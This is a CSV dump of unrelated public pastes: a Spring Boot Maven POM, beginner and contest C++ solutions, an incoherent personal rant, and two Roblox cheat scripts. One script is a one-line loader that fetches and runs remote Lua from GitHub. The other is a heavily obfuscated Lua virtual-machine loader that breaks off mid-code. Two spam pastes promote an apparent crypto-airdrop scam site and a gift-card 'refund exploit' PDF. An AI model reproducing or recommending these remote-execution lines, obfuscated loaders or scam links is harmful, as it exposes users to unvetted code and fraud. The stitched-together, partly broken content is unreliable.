id,title,username,language,date,content
rX1EWQwi,Pet Simulator 99! [‚òÅÔ∏èUPD 5] AutoFarm Script,Project-WD,Lua,Monday 29th of January 2024 12:01:50 PM CDT,"-- üÜïUpdate (30/01/2024)
-- AUTO FARM | AUTO GIFTS | AUTO HATCH | AUTO RANK & MORE
-- Scriptüìù: Paste into your executor
loadstring(game:HttpGet(""https://raw.githubusercontent.com/REDzHUBz/PetSimulator99/main/redz9999.lua"" ))()"
zfv3LVnm,Untitled,soyl,XML,Monday 29th of January 2024 11:53:18 AM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
		 xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.7.2</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>

	<groupId>ru.practicum</groupId>
	<artifactId>shareit</artifactId>
	<version>0.0.1-SNAPSHOT</version>

	<name>ShareIt</name>

	<properties>
		<java.version>11</java.version>
	</properties>

	<dependencies>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.postgresql</groupId>
			<artifactId>postgresql</artifactId>
			<scope>runtime</scope>
		</dependency>
		<dependency>
			<groupId>com.h2database</groupId>
			<artifactId>h2</artifactId>
			<scope>runtime</scope>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-configuration-processor</artifactId>
			<optional>true</optional>
		</dependency>
		<dependency>
			<groupId>org.projectlombok</groupId>
			<artifactId>lombok</artifactId>
			<optional>true</optional>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-validation</artifactId>
		</dependency>
	</dependencies>

	<build>
		<resources>
			<resource>
				<directory>src/main/resources</directory>
				<filtering>true</filtering>
			</resource>
		</resources>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<configuration>
					<excludes>
						<exclude>
							<groupId>org.project-lombok</groupId>
							<artifactId>lombok</artifactId>
						</exclude>
					</excludes>
				</configuration>
			</plugin>
		</plugins>
		<pluginManagement>
			<plugins>
				<plugin>
					<groupId>org.apache.maven.plugins</groupId>
					<artifactId>maven-surefire-plugin</artifactId>
					<configuration>
						<systemPropertyVariables>
							<spring.profiles.active>test</spring.profiles.active>
						</systemPropertyVariables>
					</configuration>
				</plugin>
				<plugin>
					<groupId>org.apache.maven.plugins</groupId>
					<artifactId>maven-checkstyle-plugin</artifactId>
					<version>3.1.2</version>
					<configuration>
						<configLocation>checkstyle.xml</configLocation>
						<failOnViolation>true</failOnViolation>
						<logViolationsToConsole>true</logViolationsToConsole>
						<includeTestSourceDirectory>true</includeTestSourceDirectory>
					</configuration>
					<executions>
						<execution>
							<goals>
								<goal>check</goal>
							</goals>
							<phase>compile</phase>
						</execution>
					</executions>
					<dependencies>
						<dependency>
							<groupId>com.puppycrawl.tools</groupId>
							<artifactId>checkstyle</artifactId>
							<version>10.3</version>
						</dependency>
					</dependencies>
				</plugin>
				<plugin>
					<groupId>com.github.spotbugs</groupId>
					<artifactId>spotbugs-maven-plugin</artifactId>
					<version>4.7.0.0</version>
					<configuration>
						<effort>Max</effort>
						<threshold>High</threshold>
					</configuration>
					<executions>
						<execution>
							<goals>
								<goal>check</goal>
							</goals>
						</execution>
					</executions>
				</plugin>
				<plugin>
					<groupId>org.jacoco</groupId>
					<artifactId>jacoco-maven-plugin</artifactId>
					<version>0.8.8</version>
					<configuration>
						<output>file</output>
					</configuration>
					<executions>
						<execution>
							<id>jacoco-initialize</id>
							<goals>
								<goal>prepare-agent</goal>
							</goals>
						</execution>
						<execution>
							<id>jacoco-check</id>
							<goals>
								<goal>check</goal>
							</goals>
							<configuration>
								<rules>
									<rule>
										<element>BUNDLE</element>
										<limits>
											<limit>
												<counter>INSTRUCTION</counter>
												<value>COVERED-RATIO</value>
												<minimum>0.01</minimum>
											</limit>
											<limit>
												<counter>LINE</counter>
												<value>COVERED-RATIO</value>
												<minimum>0.9</minimum>
											</limit>
											<limit>
												<counter>BRANCH</counter>
												<value>COVERED-RATIO</value>
												<minimum>0.6</minimum>
											</limit>
											<limit>
												<counter>COMPLEXITY</counter>
												<value>COVERED-RATIO</value>
												<minimum>0.6</minimum>
											</limit>
											<limit>
												<counter>METHOD</counter>
												<value>COVERED-RATIO</value>
												<minimum>0.7</minimum>
											</limit>
											<limit>
												<counter>CLASS</counter>
												<value>MISSED-COUNT</value>
												<maximum>1</maximum>
											</limit>
										</limits>
									</rule>
								</rules>
							</configuration>
						</execution>
						<execution>
							<id>jacoco-report</id>
							<phase>test</phase>
							<goals>
								<goal>report</goal>
							</goals>
						</execution>
					</executions>
				</plugin>
			</plugins>
		</pluginManagement>
	</build>
	<profiles>
		<profile>
			<id>check</id>
			<build>
				<plugins>
					<plugin>
						<groupId>org.apache.maven.plugins</groupId>
						<artifactId>maven-checkstyle-plugin</artifactId>
					</plugin>
					<plugin>
						<groupId>com.github.spotbugs</groupId>
						<artifactId>spotbugs-maven-plugin</artifactId>
					</plugin>
				</plugins>
			</build>
			<reporting>
				<plugins>
					<plugin>
						<groupId>com.github.spotbugs</groupId>
						<artifactId>spotbugs-maven-plugin</artifactId>
					</plugin>
				</plugins>
			</reporting>
		</profile>
		<profile>
			<id>coverage</id>
			<build>
				<plugins>
					<plugin>
						<groupId>org.jacoco</groupId>
						<artifactId>jacoco-maven-plugin</artifactId>
					</plugin>
				</plugins>
			</build>
		</profile>
	</profiles>

</project>
"
FaStEdE6,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Monday 29th of January 2024 11:51:37 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://netdrop-claim.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop-claim.netlify.app/

706455"
0hMvYi2m,non sequitur  program.file deleted,shiftdot515,C++,Monday 29th of January 2024 11:27:52 AM CDT,"program file deleted
edlin  << D
why don't u put your patch the or stupid shcck value 
ok what else is new

program file deleted
D

I used heavy kill ring undo lol and ctrl-z won't find it... so I'm ""I just died    in your arms tonight ...  must have been something she said "" strangely thats like Haley was in the same theater... weird it used to be recurring fantasy
real fantasy, sexual fantasy and I had finally captured it.   Will not bother with [a] noir hashtag joke.
 lol top my very Japanese  B/iiitchxxxxx backspace backspace   that part of lol of Jimmi Hendrix was overrated.
I'm also like all night long, is a lawsuit , sung to ""do like lock my doors at night"" yeah that falsetto was fun but its something bout fat b/tch law suit night  something refer ential lady gaga, starshield sunshine or whatever it was'
non sequitur /n≈èn sƒïk‚Ä≤wƒ≠-t…ôr, -tooÕùr‚Ä≥/
noun
An inference or conclusion that does not follow from the premises or evidence.
A statement that does not follow logically from what preceded it.
In law or logic, an inference or a conclusion which does not follow from the premises.

D
Hot and Heavy could be said. but I think I'll blog it anyway.  
mb 
oh somone did say princess di, but I'm not going to be able to remake the file, like that.


then theres that one spoken word female rap song,   not blondie,, oh my godwhatthef/ck why would #meh
for some reason listening right to medusa track 1, mp3 converted from the acc I got from cd to Itunes so 112 = kick ass mono mp3 on this right now. ther other track I got from thinking what next after that video, that did blow me away..
lol but I was thinking if they went grunge and the hd that wouldnt ws the thing.      //////[[[[[[[////*****]]
now it's auto playing ? did I not notice it does that,, yes... take on me via the digital 45 

singing the chorusxxxxxo0000000x000xx0
oh   drop  drop to the melody/!!!!!XXXXX!!!

so now its the 1 zeppelin track I brought over   
I was gogin move to my google drive but why  not right now its not that stupid
no I dont want to! I desire not to computer!

also another girlfriend not to do this here.............xxxxxxxxxxxxxxxxssssss0000


when Trump was in that boarding college / military school thing.
I wanna punk you first, a theme book, common activity, similar to drawing

I remember how I'd describe it, and that doesn't matter , because I sprang from the bed, 
and lost that part, that part of the subject matter.
Oh but that fantasy that preceded was D&D based, and the star that appeared
u'know  [Modern Family ] as soon as I thought he looked like him.
the show went so long really any one of them could do; manny
oh and he was to my left.

And he was conservativly trained to read remmber hes from a nother time children so it's like a pigeon

he's has to peck wanna, so it doesn't exist anymore, and it doesnt -- but otherwise he read that book.
That's because he's so good at debate, is, half of what he is isn't ! !
And, something like that can't be said on t v , it would be considered ! profane; part of of Abortion Law
they woulnd't know what to do, they'd , they'd cut to a video they don't own.
that's why he's so confident

""When Abortion Law was just poison pills in Japanese.""

now it's no doubt ....
actually that was a while ago
he's worse than a bird-brain he's pigeon gimp
It's not like the front man in the video I just saw.
I know he has left right brain activity. throughout the whole thing,
yeah it was a kick ass video.. 
there used to b 2 one hit wonders, like they show you the video , and then like what else 
and then then they stop.  but with a t v with channels that   shouldn't make a difference
I'm not gonna link here I don't want to go *threw the click thru!
Died in your arms tonight.  It must have been something you said; that's what I put in duckduckgo and everything
So it might have been semi-leet.  But u know who cares.

Chromebook arrow keys are so special.
Damn that's why I really wanted to keep file, that's what' was my moodswing background noise in
the first paragraphs0000xxxx---->>>>!<

nonsequtier program file deleted
the control z   undo    but  kill ring just undeleted her face
yeah the book was also considered so emo, that why American Science put timelock on secure socket layer, and they WERE
thinking emoo a t the time.    even at my college lecturers summoned it in debate!

and all that money about blind brothels !S@ the liberals will never know
used to be lawful schools for the blind
notice how tight the wordings  are for certain ""civils right era "" legislation""
then money is reused in the same reason for [a] similar industry  and kill everyone but Nixon
social economic warfare
now cut out
cut out of the country
And was Texas Last or first 
xxx8888xxxx
  no it's our new god

So they love of money is the root of all evil, but their the better christians....
conservative bias in mainstream media -- what you don't know boosts are ratings

Texas is our new god, Alabama is our sinner-saint.

Nixon should have been sectioned why don't they cut that out with their Abortion Package
Biden  should not debate Written debate only!
Debate thru Emooo

Haley Also.

stop making sense, I don't bring anything from that, 
one track from louder than bombs la
and 1 cold play mb see if there's cold play!
relating to computer now
Renaming the dot in the cold play file name @@#
and black room and medusa
oh Yeah I gotta do that......something xxxssdddddddd
  l naguage is leaving me
   in silence
 yeah I can really on take a the liberal fantasy part 1 jewel in the crown
and those changes well it's not the same What was GOD is now wroNG in the united states







gotta find the name for this right and share this edit already!
well take on me is back!

and now you turn to go oh oh


so early and I dropped out, but I liked it... you know for the brige.... and now it's 56k achilles last stand.. mono .. made to be a mono track not like some ** filter after the fact  btw orginally ""patched"" in computer from tape... yeah with some bronze in the patch cable..... yeah yeah it had to be! 
     ok cool
one more time as guest ? ill think about....    xx/]&[
like trump is nixon *LOL*LOL mono.

non sequitur  program file deleted
======+++++++++========="
yzpUr2gV,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Monday 29th of January 2024 11:09:45 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/19Hbtao1NkH151RIhoWLJ9mhp8TPYzmdb/view?usp=g2a_refund_exploit_184136.pdf
 
Working as of
29 January 2024"
FTPpswcp,10518 - How Many Calls?,MiinaMagdy,C++,Monday 29th of January 2024 10:45:19 AM CDT,"/*
+---------------------------------------------+
|                                             |
|       ¬© 29/01/2024 (15:37) MinaMagdy        |
|                                             |
+---------------------------------------------+
*/
#include <bits/stdc++.h>
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>

using namespace std;
using namespace __gnu_pbds;
#define ordered_set tree<int, null_type, less<int>, rb_tree_tag, tree_order_statistics_node_update>
#define multi_ordered_set tree<int, null_type, less_equal<int>, rb_tree_tag, tree_order_statistics_node_update>
#define endl ""\n""
#define MOD 1000000007
#define INF 2000000000
#define all(s) s.begin(), s.end()
#define rall(s) s.rbegin(), s.rend()
#define sz(x) int(x.size())

typedef long long ll;
typedef long double ld;
typedef unsigned long long ull;
#include <ext/numeric>
using namespace __gnu_cxx;
int mod = 1000000009;
typedef vector<vector<int>> matrix;
struct mul
{
    int n;
    mul(int n) : n(n) {}
    matrix operator()(const matrix &a, const matrix &b)
    {
        assert(a[0].size() == b.size());
        matrix c(a.size(), vector<int>(b[0].size(), 0));
        for (int i = 0; i < a.size(); i++)
        {
            for (int j = 0; j < b[0].size(); j++)
            {
                for (int k = 0; k < b.size(); k++)
                {
                    c[i][j] += a[i][k] * 1ll * b[k][j] % mod;
                    if (c[i][j] >= mod)
                        c[i][j] -= mod;
                }
            }
        }
        return c;
    }
};

matrix identity_element(const mul &m)
{
    matrix res(m.n, vector<int>(m.n, 0));
    for (int i = 0; i < m.n; i++)
        res[i][i] = 1;
    return res;
}

void solve()
{
    ll n;
    int b;
    int idx = 0;
    while (cin >> n >> b, n || b)
    {
        matrix m = {
            {0, 1, 0},
            {1, 1, 1},
            {0, 0, 1}};
        matrix f1 = {
            {1},
            {1},
            {1}};
        mod = b;
        mul mm(3);
        cout << ""Case "" << ++idx << "": "" << n << "" "" << b << "" "" << mm(power(m, n, mm), f1)[0][0] << endl;
    }
}

int main(void)
{
    ios_base::sync_with_stdio(false), cin.tie(NULL), cout.tie(NULL);
    int testcase = 1;
    // cin >> testcase;
    while (testcase--)
        solve();
    return 0;
}"
imKyTf31,Untitled,Josif_tepe,C++,Monday 29th of January 2024 10:30:52 AM CDT,"#include <iostream>
using namespace std;

int main()
{
    int a, b, c;
    cin >> a >> b >> c;
    
    cout << a + b + c * c << endl;
    return 0;
}

"
ikMc6niJ,Untitled,Josif_tepe,C++,Monday 29th of January 2024 10:25:51 AM CDT,"#include <iostream>
using namespace std;

int main()
{
    int a, b, c, d, e;
    cin >> a >> b >> c >> d >> e;
    
    int najgolem_broj = e * 100 + d * 10 + c;
    cout << najgolem_broj << endl;
    cout << najgolem_broj * 2 << endl;
    return 0;
}

"
DCMMm6HD,Untitled,Josif_tepe,C++,Monday 29th of January 2024 10:18:35 AM CDT,"#include <iostream>
using namespace std;

int main()
{
    int a, b, c;
    cin >> a >> b >> c;
    int najmal, sreden, najgolem;
    if(a <= b and a <= c) {
        najmal = a;
        if(b <= c) {
            sreden = b;
            najgolem = c;
        }
        else {
            sreden = c;
            najgolem = b;
        }
    }
    else if(b <= a and b <= c) {
        najmal = b;
        if(a <= c) {
            sreden = a;
            najgolem = c;
        }
        else {
            sreden = c;
            najgolem = a;
        }
    }
    else {
        najmal = c;
        if(a <= b) {
            sreden = a;
            najgolem = b;
        }
        else {
            sreden = b;
            najgolem = a;
        }
    }
    int rezultat = (najgolem - sreden) * 10 + (sreden - najmal) * 10;
    cout << rezultat << endl;
    return 0;
}

"
iq6NMFPZ,2. Remove Invalid,Spocoman,C++,Monday 29th of January 2024 09:58:53 AM CDT,"// TARIKAT EDITION :)

#include <iostream>
#include <string>

using namespace std;

int main()
{
    string line;
    getline(cin, line);

    while (line != ""end"") {
        if (isdigit(line[0])) {
            cout << line << endl;
        }       
        getline(cin, line);
    }

    return 0;
}"
ygYvRk0P,Untitled,Josif_tepe,C++,Monday 29th of January 2024 09:57:04 AM CDT,"#include <iostream>
using namespace std;

int main()
{
    int tm1, ts1;
    int tm2, ts2;
    int dm1, ds1;
    int dm2, ds2;
    
    cin >> tm1 >> ts1;
    cin >> tm2 >> ts2;
    cin >> dm1 >> ds1;
    cin >> dm2 >> ds2;
    
    int tufi = (tm1 * 60) + ts1 + (tm2 * 60) + ts2;
    int dvojce = (dm1 * 60) + ds1 + (dm2 * 60) + ds2;
    
    int razlika;
    if(tufi < dvojce) {
        cout << ""T"" << endl;
        razlika = dvojce - tufi;
    }
    else {
        cout << ""D"" << endl;
        razlika = tufi - dvojce;
    }
    int minuti = razlika / 60;
    int sekundi = razlika % 60;
    cout << minuti << endl;
    cout << sekundi << endl;
    return 0;
}

"
mHnK1UpT,Azure Mines Ambro/Nihi Finder,___11255___,Lua,Monday 29th of January 2024 09:38:05 AM CDT,"local Ore1 = ""Ambrosia"" -- goes for this ore first (if not found then tries to find nihilium)
local Ore2 = ""Nihilium""


local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==5) then v27=v24;v28=nil;function v28(...)return {...},v12(""#"",...);end v18=6;end if (v18==2) then function v22()local v31=0 -0 ;local v32;while true do if (v31==(620 -(555 + 64))) then return v32;end if (v31==(0 -0)) then v32=v1(v16,v19,v19);v19=v19 + 1 ;v31=1 -0 ;end end end v23=nil;function v23()local v33,v34=v1(v16,v19,v19 + 2 );v19=v19 + (929 -(214 + 713)) ;return (v34 * (65 + 191)) + v33 ;end v18=3;end if (v18==4) then function v25()local v35=v24();local v36=v24();local v37=1 + 0 ;local v38=(v21(v36,878 -(282 + 595) ,200 -(67 + 113) ) * ((1639 -(1523 + 114))^32)) + v35 ;local v39=v21(v36,21,28 + 3 );local v40=((v21(v36,78 -(81 -35) )==(1 -0)) and  -(1066 -(68 + 997))) or 1 ;if (v39==(952 -(802 + 149 + 1))) then if (v38==(0 -0)) then return v40 * 0 ;else v39=1271 -(226 + 1044) ;v37=0 + 0 ;end elseif (v39==(8913 -(7657 -(368 + 423)))) then return ((v38==(117 -(32 + (185 -100)))) and (v40 * ((1 + (0 -0))/(0 + 0)))) or (v40 * NaN) ;end return v8(v40,v39-((345 + 1635) -(892 + 65)) ) * (v37 + (v38/((4 -2)^(95 -43)))) ;end v26=nil;function v26(v41)local v42;if  not v41 then v41=v24();if (v41==(18 -(10 + 8))) then return """";end end v42=v3(v16,v19,(v19 + v41) -(3 -2) );v19=v19 + v41 ;local v43={};for v66=1, #v42 do v43[v66]=v2(v1(v3(v42,v66,v66)));end return v6(v43);end v18=5;end if (v18==6) then v29=nil;function v29()local v44=0;local v45;local v46;local v47;local v48;local v49;local v50;local v51;while true do if (v44==(9 -7)) then v49=nil;v50=nil;v44=3;end if (v44~=(0 + 0)) then else v45=0 + 0 ;v46=nil;v44=1;end if ((2 -1)~=v44) then else v47=nil;v48=nil;v44=2;end if ((3 + 0)~=v44) then else v51=nil;while true do local v88=0;while true do if (v88~=0) then else if (v45==3) then local v96=1130 -(87 + 1043) ;while true do if (v96==(448 -(10 + 438))) then for v101=1,v24() do v47[v101-1 ]=v29();end return v49;end end end if ((0 + 0)==v45) then local v97=0;while true do if (v97~=(0 -0)) then else v46={};v47={};v97=1 + 0 ;end if (v97~=1) then else v48={};v45=1181 -(1123 + 57) ;break;end end end v88=1 + 0 ;end if (v88==(255 -(163 + 91))) then if (v45==(1931 -(1869 + 61))) then local v98=0;while true do if (v98~=1) then else v51={};v45=1 + 1 ;break;end if (v98==(0 -0)) then v49={v46,v47,nil,v48};v50=v24();v98=1475 -(1329 + 145) ;end end end if (v45~=(973 -(140 + 831))) then else local v99=0;local v100;while true do if (v99~=(1850 -(1409 + 441))) then else v100=0;while true do if (v100~=1) then else for v127=1,v24() do local v128=718 -(15 + 703) ;local v129;while true do if (v128==(0 + 0)) then v129=v22();if (v21(v129,439 -(262 + 176) ,1722 -(345 + 1376) )~=(688 -(198 + 490))) then else local v604=0;local v605;local v606;local v607;while true do if (v604==(0 -0)) then v605=v21(v129,4 -2 ,1209 -(696 + 510) );v606=v21(v129,7 -3 ,1268 -(1091 + 171) );v604=1 + 0 ;end if (v604==1) then local v655=0;local v656;while true do if (v655~=(0 -0)) then else v656=0;while true do if (v656==(3 -2)) then v604=376 -(123 + 251) ;break;end if (v656~=0) then else local v669=0;while true do if (v669==1) then v656=4 -3 ;break;end if (v669==(698 -(208 + 490))) then v607={v23(),v23(),nil,nil};if (v605==0) then local v670=0 + 0 ;local v671;while true do if (v670==0) then v671=0 + 0 ;while true do if (v671~=0) then else v607[839 -(660 + 176) ]=v23();v607[1 + 3 ]=v23();break;end end break;end end elseif (v605==1) then v607[3]=v24();elseif (v605==2) then v607[205 -(14 + 188) ]=v24() -(2^16) ;elseif (v605==(678 -(534 + 141))) then local v676=0;local v677;while true do if (v676~=(0 + 0)) then else v677=0 + 0 ;while true do if (v677~=(0 + 0)) then else v607[3]=v24() -((3 -1)^(25 -9)) ;v607[11 -7 ]=v23();break;end end break;end end end v669=1;end end end end break;end end end if (3~=v604) then else if (v21(v606,2 + 1 ,2 + 1 )~=1) then else v607[400 -(115 + 281) ]=v51[v607[9 -5 ]];end v46[v127]=v607;break;end if (v604~=2) then else if (v21(v606,1,1 + 0 )~=(2 -1)) then else v607[2]=v51[v607[2]];end if (v21(v606,7 -5 ,2)==1) then v607[3]=v51[v607[870 -(550 + 317) ]];end v604=3 -0 ;end end end break;end end end v45=3 -0 ;break;end if (v100==(0 -0)) then for v130=1,v50 do local v131=285 -(134 + 151) ;local v132;local v133;while true do if (v131~=1) then else if (v132==(1666 -(970 + 695))) then v133=v22()~=0 ;elseif (v132==(3 -1)) then v133=v25();elseif (v132~=(1993 -(582 + 1408))) then else v133=v26();end v51[v130]=v133;break;end if (v131~=(0 -0)) then else v132=v22();v133=nil;v131=1;end end end v49[3]=v22();v100=1 -0 ;end end break;end end end break;end end end break;end end end v30=nil;v18=7;end if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"".."",function(v52)if (v1(v52,2)==79) then v20=v0(v3(v52,1,1));return """";else local v82=0;local v83;while true do if (v82==0) then v83=v2(v0(v52,16));if v20 then local v95=v5(v83,v20);v20=nil;return v95;else return v83;end break;end end end end);v18=1;end if (v18==3) then v24=nil;function v24()local v53,v54,v55,v56=v1(v16,v19,v19 + (11 -8) );v19=v19 + (1828 -(1195 + 629)) ;return (v56 * (22187834 -5410618)) + (v55 * (65777 -(187 + 54))) + (v54 * (1036 -(162 + 434 + 184))) + v53 ;end v25=nil;v18=4;end if (v18==7) then function v30(v57,v58,v59)local v60=v57[1];local v61=v57[2];local v62=v57[3];return function(...)local v68=v60;local v69=v61;local v70=v62;local v71=v28;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12(""#"",...) -1 ;local v77={};local v78={};for v84=0,v76 do if (v84>=v70) then v74[v84-v70 ]=v75[v84 + 1 ];else v78[v84]=v75[v84 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do local v85=0;while true do if (v85==0) then v80=v68[v72];v81=v80[1];v85=1;end if (v85==1) then if (v81<=27) then if (v81<=13) then if (v81<=6) then if (v81<=2) then if (v81<=0) then local v104=0;local v105;local v106;local v107;while true do if (v104==1) then v107=0;for v352=v105,v80[4] do v107=v107 + 1 ;v78[v352]=v106[v107];end break;end if (0==v104) then v105=v80[2];v106={v78[v105](v13(v78,v105 + 1 ,v73))};v104=1;end end elseif (v81==1) then local v137;local v138;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v138=v80[2];v137=v78[v80[3]];v78[v138 + 1 ]=v137;v78[v138]=v137[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3]~=0 ;v72=v72 + 1 ;v80=v68[v72];v138=v80[2];v78[v138](v13(v78,v138 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v138=v80[2];v137=v78[v80[3]];v78[v138 + 1 ]=v137;v78[v138]=v137[v80[4]];else local v147;local v148;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v148=v80[2];v147=v78[v80[3]];v78[v148 + 1 ]=v147;v78[v148]=v147[v80[4]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v148=v80[2];v78[v148]=v78[v148](v13(v78,v148 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v147=v78[v80[4]];if  not v147 then v72=v72 + 1 ;else v78[v80[2]]=v147;v72=v80[3];end end elseif (v81<=4) then if (v81==3) then local v158=v69[v80[3]];local v159;local v160={};v159=v10({},{__index=function(v316,v317)local v318=0;local v319;while true do if (v318==0) then v319=v160[v317];return v319[1][v319[2]];end end end,__newindex=function(v320,v321,v322)local v323=0;local v324;while true do if (v323==0) then v324=v160[v321];v324[1][v324[2]]=v322;break;end end end});for v325=1,v80[4] do v72=v72 + 1 ;local v326=v68[v72];if (v326[1]==45) then v160[v325-1 ]={v78,v326[3]};else v160[v325-1 ]={v58,v326[3]};end v77[ #v77 + 1 ]=v160;end v78[v80[2]]=v30(v158,v159,v59);elseif (v78[v80[2]]<v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end elseif (v81==5) then if  not v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end else v78[v80[2]][v80[3]]=v80[4];end elseif (v81<=9) then if (v81<=7) then local v108;local v109;local v110;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v110=v80[2];v109={v78[v110](v13(v78,v110 + 1 ,v80[3]))};v108=0;for v134=v110,v80[4] do v108=v108 + 1 ;v78[v134]=v109[v108];end v72=v72 + 1 ;v80=v68[v72];if v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end elseif (v81==8) then v59[v80[3]]=v78[v80[2]];else local v167=v80[2];local v168={v78[v167](v13(v78,v167 + 1 ,v80[3]))};local v169=0;for v328=v167,v80[4] do v169=v169 + 1 ;v78[v328]=v168[v169];end end elseif (v81<=11) then if (v81>10) then local v170=v80[2];local v171=v80[4];local v172=v170 + 2 ;local v173={v78[v170](v78[v170 + 1 ],v78[v172])};for v331=1,v171 do v78[v172 + v331 ]=v173[v331];end local v174=v173[1];if v174 then local v362=0;while true do if (v362==0) then v78[v172]=v174;v72=v80[3];break;end end else v72=v72 + 1 ;end else local v175;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v175=v80[2];v78[v175]=v78[v175](v78[v175 + 1 ]);v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];end elseif (v81>12) then do return;end else local v185=v80[2];local v186,v187=v71(v78[v185](v78[v185 + 1 ]));v73=(v187 + v185) -1 ;local v188=0;for v334=v185,v73 do v188=v188 + 1 ;v78[v334]=v186[v188];end end elseif (v81<=20) then if (v81<=16) then if (v81<=14) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];elseif (v81>15) then local v189;local v190;local v191;v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v191=v80[2];v78[v191](v78[v191 + 1 ]);v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v191=v80[2];v190=v78[v80[3]];v78[v191 + 1 ]=v190;v78[v191]=v190[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v191=v80[2];v78[v191]=v78[v191](v13(v78,v191 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];if ((v80[3]==""_ENV"") or (v80[3]==""getfenv"")) then v78[v80[2]]=v59;else v78[v80[2]]=v59[v80[3]];end v72=v72 + 1 ;v80=v68[v72];v191=v80[2];v190=v78[v80[3]];v78[v191 + 1 ]=v190;v78[v191]=v190[v80[4]];v72=v72 + 1 